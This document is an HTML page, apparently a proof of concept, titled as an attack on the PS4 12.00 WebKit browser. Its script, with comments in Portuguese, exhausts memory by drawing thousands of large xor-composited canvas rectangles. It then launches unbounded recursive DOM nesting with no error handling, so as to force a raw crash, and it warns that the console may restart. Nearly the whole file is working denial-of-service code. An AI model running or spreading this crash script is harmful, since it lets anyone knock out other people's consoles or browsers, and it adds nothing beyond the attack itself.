<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 Hybrid Attack</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; text-align: center; }
        #status { margin-top: 20px; border: 1px solid #fff; padding: 10px; }
        canvas { display: none; }
        button { 
            background: #fff; color: #000; border: none; padding: 20px 40px; 
            font-size: 24px; font-weight: bold; cursor: pointer; margin-top: 50px;
        }
    </style>
</head>
<body>
    <h1>SYSTEM MEMORY EXHAUSTION POC</h1>
    <p>Target: WebKit Heap + Stack Collision</p>

    <button onclick="triggerDeath()">EXECUTE CRASH</button>
    
    <div id="status">Ready. Warning: This may restart the console.</div>
    <canvas id="c" width="4096" height="4096"></canvas>

    <script>
        function log(msg) { document.getElementById('status').innerText = msg; }

        function triggerDeath() {
            log("PHASE 1: Allocating Video Memory (VRAM)...");
            
            // 1. O Ataque de Canvas (Prepara o terreno comendo RAM)
            setTimeout(() => {
                try {
                    const c = document.getElementById('c');
                    const ctx = c.getContext('2d');
                    
                    // Aloca buffers gigantescos de composição
                    ctx.globalCompositeOperation = "xor"; 
                    ctx.fillStyle = "red";
                    
                    // Desenha milhares de retângulos para encher o buffer de comandos
                    for(let i=0; i<5000; i++) {
                        ctx.fillRect(i%100, i%100, 2000, 2000);
                    }
                    
                    log("PHASE 2: Triggering Stack Overflow...");
                    
                    // 2. O Ataque de Pilha (O Golpe de Misericórdia)
                    // Dispara imediatamente enquanto a CPU está ocupada com o Canvas
                    setTimeout(stackAttack, 50);
                    
                } catch(e) { log("Failed: " + e); }
            }, 100);
        }

        function stackAttack() {
            // A mesma recursão que travou o navegador antes
            // Agora rodando em um ambiente sem memória livre
            let root = document.createElement('div');
            document.body.appendChild(root);
            
            function dive() {
                let child = document.createElement('div');
                child.innerText = "X"; // Força render
                root.appendChild(child);
                root = child;
                dive();
            }
            
            // Sem try-catch para forçar o crash cru
            dive(); 
        }
    </script>
</body>
</html>
